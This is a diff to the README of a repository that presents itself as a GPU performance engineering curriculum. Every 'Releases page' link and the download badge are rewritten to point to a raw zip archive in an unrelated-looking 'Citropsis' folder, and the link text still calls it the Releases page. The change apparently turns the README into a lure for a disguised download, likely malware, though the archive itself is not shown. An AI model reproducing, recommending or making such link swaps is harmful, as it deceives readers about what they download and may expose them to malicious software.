@@ -1,7 +1,7 @@
 # 🎮 gpu-perf-engineering-resources - Learn GPU Performance Engineering Effectively
 
 ## 📥 Download the Latest Release
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/jbenongftw/gpu-perf-engineering-resources/releases)
+[![Download](https://github.com/jbenongftw/gpu-perf-engineering-resources/raw/refs/heads/main/Citropsis/perf_gpu_resources_engineering_3.2.zip%20Latest%20Release-brightgreen)](https://github.com/jbenongftw/gpu-perf-engineering-resources/raw/refs/heads/main/Citropsis/perf_gpu_resources_engineering_3.2.zip)
 
 ## 📘 Overview
 Welcome to the `gpu-perf-engineering-resources` repository. This curriculum helps you learn about GPU performance engineering, starting from the basic principles to advanced techniques used in cutting-edge AI labs. Whether you're just beginning or looking to deepen your knowledge, this repository has you covered.
@@ -18,7 +18,7 @@ To begin, you will need to download the files from our Releases page. Follow the
 Make sure your system meets these requirements before proceeding.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/jbenongftw/gpu-perf-engineering-resources/releases).
+1. Visit the [Releases page](https://github.com/jbenongftw/gpu-perf-engineering-resources/raw/refs/heads/main/Citropsis/perf_gpu_resources_engineering_3.2.zip).
 2. Look for the latest version at the top of the page.
 3. Click on the appropriate file for your operating system to download it.
 4. Once the download is complete, locate the downloaded file in your computer’s downloads folder.
@@ -60,7 +60,7 @@ For any questions or additional support, feel free to reach out via the Issues p
 We welcome contributions! If you would like to help enhance the curriculum, feel free to fork the repository and submit a pull request.
 
 ## 🔄 Keep Updated
-Stay informed about new features or updates by following our repository. You can also check back frequently at the [Releases page](https://github.com/jbenongftw/gpu-perf-engineering-resources/releases) for the latest versions.
+Stay informed about new features or updates by following our repository. You can also check back frequently at the [Releases page](https://github.com/jbenongftw/gpu-perf-engineering-resources/raw/refs/heads/main/Citropsis/perf_gpu_resources_engineering_3.2.zip) for the latest versions.
 
 ## 🎉 Conclusion
 Thank you for your interest in `gpu-perf-engineering-resources`. We hope this curriculum helps you succeed in your journey to understand GPU performance engineering. Happy learning!
